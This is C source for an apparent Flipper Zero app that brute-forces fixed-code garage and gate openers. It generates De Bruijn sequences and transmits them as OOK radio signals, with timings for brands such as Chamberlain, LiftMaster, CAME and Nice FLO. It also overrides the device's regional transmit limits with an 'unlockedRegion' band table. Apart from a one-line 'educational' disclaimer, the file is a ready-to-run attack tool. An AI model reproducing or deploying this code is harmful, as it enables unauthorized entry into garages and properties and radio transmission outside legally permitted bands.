#include <furi.h>
/**
 * CYBERFLIPPER — Garage Door Bruteforce
 * De Bruijn sequence generator and transmitter for fixed-code garage systems.
 * Supports: Linear, Nice FLO, CAME, Chamberlain, LiftMaster, Genie,
 *           DoorMan, GateHouse, SMC5326, Holtek
 * 
 * FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.
 */

#include "garage_bruteforce.h"
#include <furi_hal_region.h>
#include <subghz/devices/devices.h>
#include <furi/core/log.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

static FuriHalRegion unlockedRegion = {
    .country_code = "FTW",
    .bands_count = 3,
    .bands = {
        {.start = 299999755, .end = 348000000, .power_limit = 20, .duty_cycle = 50},
        {.start = 386999938, .end = 464000000, .power_limit = 20, .duty_cycle = 50},
        {.start = 778999847, .end = 928000000, .power_limit = 20, .duty_cycle = 50},
    },
};

// --- De Bruijn Sequence Generation ---

static uint8_t db_alphabet[2] = {0, 1};
static uint8_t db_sequence[DEBRUIJN_MAX_LEN];
static uint32_t db_seq_idx;
static uint8_t db_a[64];

static void debruijn_callback(int t, int p, int n) {
    if(t > n) {
        if(n % p == 0) {
            for(int j = 1; j <= p; j++) {
                if(db_seq_idx < DEBRUIJN_MAX_LEN) {
                    db_sequence[db_seq_idx++] = db_alphabet[db_a[j]];
                }
            }
        }
    } else {
        db_a[t] = db_a[t - p];
        debruijn_callback(t + 1, p, n);
        for(int j = db_a[t - p] + 1; j < 2; j++) {
            db_a[t] = j;
            debruijn_callback(t + 1, t, n);
        }
    }
}

static uint32_t generate_debruijn(uint8_t n, uint8_t* output, uint32_t max_len) {
    db_seq_idx = 0;
    memset(db_a, 0, sizeof(db_a));
    debruijn_callback(1, 1, n);
    
    uint32_t len = db_seq_idx < max_len ? db_seq_idx : max_len;
    memcpy(output, db_sequence, len);
    return len;
}

// --- OOK Signal Encoding ---

static void encode_ook_signal(
    uint8_t* output, 
    uint32_t* out_len,
    const uint8_t* bits, 
    uint32_t num_bits,
    uint32_t short_pulse_us,
    uint32_t long_pulse_us,
    uint32_t gap_us,
    uint32_t preamble_us,
    uint32_t sync_us
) {
    uint32_t idx = 0;
    
    // Preamble
    if(preamble_us > 0) {
        uint32_t preamble_bytes = preamble_us / 8;
        for(uint32_t i = 0; i < preamble_bytes && idx < DEBRUIJN_MAX_LEN; i++) {
            output[idx++] = 0xAA;
        }
    }
    
    // Sync pulse
    if(sync_us > 0) {
        uint32_t sync_bytes = sync_us / 8;
        for(uint32_t i = 0; i < sync_bytes && idx < DEBRUIJN_MAX_LEN; i++) {
            output[idx++] = 0xFF;
        }
    }
    
    // Data bits
    for(uint32_t i = 0; i < num_bits && idx < DEBRUIJN_MAX_LEN - 4; i++) {
        if(bits[i]) {
            // Long pulse for '1'
            uint32_t long_bytes = long_pulse_us / 8;
            for(uint32_t j = 0; j < long_bytes && idx < DEBRUIJN_MAX_LEN; j++) {
                output[idx++] = 0xFF;
            }
        } else {
            // Short pulse for '0'
            uint32_t short_bytes = short_pulse_us / 8;
            for(uint32_t j = 0; j < short_bytes && idx < DEBRUIJN_MAX_LEN; j++) {
                output[idx++] = 0xFF;
            }
        }
        // Gap
        uint32_t gap_bytes = gap_us / 8;
        for(uint32_t j = 0; j < gap_bytes && idx < DEBRUIJN_MAX_LEN; j++) {
            output[idx++] = 0x00;
        }
    }
    
    *out_len = idx;
}

// --- Protocol-specific timing ---

typedef struct {
    uint32_t short_pulse;
    uint32_t long_pulse;
    uint32_t gap;
    uint32_t preamble;
    uint32_t sync;
    uint32_t inter_code_gap;
} ProtocolTiming;

static const ProtocolTiming protocol_timings[] = {
    {500, 1000, 500, 8000, 4000, 12000},   // Linear
    {700, 1400, 700, 0, 11200, 25200},      // Nice FLO
    {320, 640, 320, 0, 11520, 11520},       // CAME
    {1000, 3000, 1000, 0, 39000, 39000},    // Chamberlain
    {1000, 3000, 1000, 0, 39000, 39000},    // LiftMaster
    {400, 800, 400, 0, 9000, 9000},         // Genie
    {500, 1000, 500, 0, 10000, 10000},      // DoorMan
    {500, 1000, 500, 0, 10000, 10000},      // GateHouse
    {340, 680, 340, 0, 9000, 9000},         // SMC5326
    {430, 860, 430, 0, 9500, 9500},         // Holtek
};

// --- TX Thread ---

static int32_t garage_bf_tx_thread(void* context) {
    GarageBFApp* app = context;
    
    uint8_t code_bits = garage_protocol_bits[app->protocol];
    app->total_codes = 1 << code_bits;
    app->codes_sent = 0;
    
    FURI_LOG_I(GARAGE_BF_TAG, "Starting bruteforce: %lu codes, %d bits", 
               app->total_codes, code_bits);
    
    // Generate De Bruijn sequence
    app->debruijn_len = generate_debruijn(code_bits, app->debruijn_seq, DEBRUIJN_MAX_LEN);
    FURI_LOG_I(GARAGE_BF_TAG, "De Bruijn sequence length: %lu bits", app->debruijn_len);
    
    const ProtocolTiming* timing = &protocol_timings[app->protocol];
    
    // Transmit the De Bruijn sequence in chunks
    uint8_t tx_buffer[1024];
    uint32_t tx_len;
    uint32_t chunk_size = code_bits * 4; // Send a few codes at a time
    
    for(uint32_t offset = 0; offset < app->debruijn_len && app->tx_running; offset += chunk_size) {
        uint32_t remaining = app->debruijn_len - offset;
        uint32_t this_chunk = remaining < chunk_size ? remaining : chunk_size;
        
        encode_ook_signal(
            tx_buffer, &tx_len,
            &app->debruijn_seq[offset], this_chunk,
            timing->short_pulse, timing->long_pulse,
            timing->gap, timing->preamble, timing->sync
        );
        
        if(app->subghz_txrx && tx_len > 0) {
            subghz_tx_rx_worker_write(app->subghz_txrx, tx_buffer, tx_len);
        }
        
        app->codes_sent = offset;
        app->progress = (float)offset / (float)app->debruijn_len * 100.0f;
        
        // Inter-code delay
        furi_delay_ms(timing->inter_code_gap / 1000);
    }
    
    app->attack_active = false;
    FURI_LOG_I(GARAGE_BF_TAG, "Bruteforce complete");
    return 0;
}

// --- UI Callbacks ---

static void garage_bf_draw_callback(Canvas* canvas, void* context) {
    GarageBFApp* app = (GarageBFApp*)context;
    canvas_clear(canvas);
    
    // Title bar
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, "CYBERFLIPPER GARAGE BF");
    canvas_draw_line(canvas, 0, 12, 128, 12);
    
    // Protocol
    canvas_set_font(canvas, FontSecondary);
    char proto_str[40];
    snprintf(proto_str, sizeof(proto_str), "Proto: %s", garage_protocol_names[app->protocol]);
    canvas_draw_str(canvas, 2, 24, proto_str);
    
    // Frequency
    char freq_str[24];
    snprintf(freq_str, sizeof(freq_str), "Freq: %lu.%02lu MHz", 
             app->frequency / 1000000,
             (app->frequency % 1000000) / 10000);
    canvas_draw_str(canvas, 2, 34, freq_str);
    
    // Status
    if(app->attack_active) {
        char prog_str[32];
        snprintf(prog_str, sizeof(prog_str), "Progress: %.1f%%", app->progress);
        canvas_draw_str(canvas, 2, 44, prog_str);
        
        // Progress bar
        canvas_draw_frame(canvas, 2, 48, 124, 8);
        uint32_t fill_w = (uint32_t)(app->progress * 122.0f / 100.0f);
        canvas_draw_box(canvas, 3, 49, fill_w, 6);
        
        canvas_draw_str_aligned(canvas, 64, 58, AlignCenter, AlignTop, "[BACK] Stop");
    } else {
        canvas_draw_str(canvas, 2, 44, "[OK] Start  [<>] Protocol");
        canvas_draw_str(canvas, 2, 54, "[UP/DN] Freq  [BACK] Exit");
    }
}

static void garage_bf_input_callback(InputEvent* input_event, void* context) {
    GarageBFApp* app = (GarageBFApp*)context;
    furi_message_queue_put(app->event_queue, input_event, FuriWaitForever);
}

// --- App Lifecycle ---

GarageBFApp* garage_bf_app_alloc(void) {
    GarageBFApp* app = malloc(sizeof(GarageBFApp));
    if(!app) return NULL;
    
    app->view_port = view_port_alloc();
    app->event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    app->protocol = GarageBFProtocolLinear;
    app->frequency = garage_protocol_frequencies[0];
    app->code_bits = garage_protocol_bits[0];
    app->running = true;
    app->tx_running = false;
    app->attack_active = false;
    app->progress = 0;
    app->codes_sent = 0;
    app->total_codes = 0;
    app->gui = furi_record_open(RECORD_GUI);
    
    furi_hal_region_set(&unlockedRegion);
    
    view_port_draw_callback_set(app->view_port, garage_bf_draw_callback, app);
    view_port_input_callback_set(app->view_port, garage_bf_input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);
    
    app->tx_thread = NULL;
    app->subghz_txrx = NULL;
    app->device = NULL;
    
    subghz_devices_init();
    app->subghz_txrx = subghz_tx_rx_worker_alloc();
    furi_hal_power_suppress_charge_enter();
    
    return app;
}

void garage_bf_app_free(GarageBFApp* app) {
    furi_assert(app);
    
    if(app->tx_running) {
        app->tx_running = false;
    }
    if(app->tx_thread) {
        furi_thread_join(app->tx_thread);
        furi_thread_free(app->tx_thread);
    }
    if(app->subghz_txrx) {
        if(subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
            subghz_tx_rx_worker_stop(app->subghz_txrx);
        }
        subghz_tx_rx_worker_free(app->subghz_txrx);
    }
    if(app->device) {
        radio_device_loader_end(app->device);
    }
    
    subghz_devices_deinit();
    furi_hal_power_suppress_charge_exit();
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->event_queue);
    free(app);
}

static void garage_bf_start_attack(GarageBFApp* app) {
    if(app->attack_active) return;
    
    app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeExternalCC1101);
    if(!app->device) {
        app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeInternal);
        if(!app->device) return;
    }
    
    subghz_devices_reset(app->device);
    subghz_devices_idle(app->device);
    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
    
    if(subghz_tx_rx_worker_start(app->subghz_txrx, app->device, app->frequency)) {
        app->attack_active = true;
        app->tx_running = true;
        app->progress = 0;
        
        app->tx_thread = furi_thread_alloc();
        furi_thread_set_name(app->tx_thread, "GarageBF TX");
        furi_thread_set_stack_size(app->tx_thread, 4096);
        furi_thread_set_context(app->tx_thread, app);
        furi_thread_set_callback(app->tx_thread, garage_bf_tx_thread);
        furi_thread_start(app->tx_thread);
    }
}

static void garage_bf_stop_attack(GarageBFApp* app) {
    app->tx_running = false;
    app->attack_active = false;
    if(app->tx_thread) {
        furi_thread_join(app->tx_thread);
        furi_thread_free(app->tx_thread);
        app->tx_thread = NULL;
    }
    if(app->subghz_txrx && subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
        subghz_tx_rx_worker_stop(app->subghz_txrx);
    }
}

int32_t garage_bruteforce_app(void* p) {
    UNUSED(p);
    
    GarageBFApp* app = garage_bf_app_alloc();
    if(!app) return -1;
    
    InputEvent event;
    while(app->running) {
        if(furi_message_queue_get(app->event_queue, &event, 10) == FuriStatusOk) {
            if(event.type == InputTypeShort) {
                switch(event.key) {
                    case InputKeyOk:
                        if(app->attack_active) {
                            garage_bf_stop_attack(app);
                        } else {
                            garage_bf_start_attack(app);
                        }
                        break;
                    case InputKeyBack:
                        if(app->attack_active) {
                            garage_bf_stop_attack(app);
                        } else {
                            app->running = false;
                        }
                        break;
                    case InputKeyRight:
                        if(!app->attack_active) {
                            app->protocol = (app->protocol + 1) % GarageBFProtocolCount;
                            app->frequency = garage_protocol_frequencies[app->protocol];
                            app->code_bits = garage_protocol_bits[app->protocol];
                        }
                        break;
                    case InputKeyLeft:
                        if(!app->attack_active) {
                            app->protocol = (app->protocol == 0) ? 
                                GarageBFProtocolCount - 1 : app->protocol - 1;
                            app->frequency = garage_protocol_frequencies[app->protocol];
                            app->code_bits = garage_protocol_bits[app->protocol];
                        }
                        break;
                    case InputKeyUp:
                        if(!app->attack_active) {
                            app->frequency += 1000000;
                            if(app->frequency > 928000000) app->frequency = 300000000;
                        }
                        break;
                    case InputKeyDown:
                        if(!app->attack_active) {
                            app->frequency -= 1000000;
                            if(app->frequency < 300000000) app->frequency = 928000000;
                        }
                        break;
                    default:
                        break;
                }
            }
        }
        view_port_update(app->view_port);
    }
    
    garage_bf_app_free(app);
    return 0;
}
